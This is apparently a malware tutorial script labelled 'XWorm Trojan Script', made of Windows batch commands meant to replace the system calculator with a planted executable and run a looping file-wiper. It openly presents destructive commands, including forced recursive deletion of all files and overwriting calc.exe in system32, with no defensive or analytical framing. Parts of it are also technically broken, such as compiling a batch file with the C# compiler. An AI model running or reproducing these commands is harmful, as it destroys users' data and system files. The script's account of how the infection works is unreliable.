## XWorm Trojan Script
 
## This script will infect a system through the calculator application and erase everything with a series of timed instances
 
## First, we will create a malicious executable and hide it in the calculator application
 
## We will use a batch file to create the executable
 
## Create the batch file
 
echo @echo off > infect.bat
echo echo Infecting System... >> infect.bat
echo copy infect.exe %windir% >> infect.bat
echo del infect.bat >> infect.bat
echo start %windir%\infect.exe >> infect.bat
 
## Now we will compile the batch file into an executable
 
## Compile the batch file
 
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:infect.exe infect.bat
 
## Now we will hide the executable in the calculator application
 
## Hide the executable in the calculator application
 
copy infect.exe %windir%\system32\calc.exe
 
## Now we will create a script to delete all files in the system
 
## Create the script
 
echo @echo off > erase.bat
echo echo Erasing System... >> erase.bat
echo del /f /s /q *.* >> erase.bat
echo del /f /s /q *.exe >> erase.bat
echo del /f /s /q *.bat >> erase.bat
 
## Now we will create a script to start the calculator application
 
## Create the script
 
echo @echo off > startcalc.bat
echo echo Starting Calculator... >> startcalc.bat
echo start %windir%\system32\calc.exe >> startcalc.bat
 
## Now we will create a script to start the erase script
 
## Create the script
 
echo @echo off > starterase.bat
echo echo Starting Erase Script... >> starterase.bat
echo start erase.bat >> starterase.bat
 
## Now we will create a script to run the startcalc and starterase scripts at a timed interval
 
## Create the script
 
echo @echo off > timer.bat
echo echo Starting Timer... >> timer.bat
echo :loop >> timer.bat
echo start startcalc.bat >> timer.bat
echo timeout /t 5 >> timer.bat
echo start starterase.bat >> timer.bat
echo timeout /t 5 >> timer.bat
echo goto loop >> timer.bat
 
## Finally, we will run the timer script to start the infection
 
## Run the timer script
 
start timer.bat
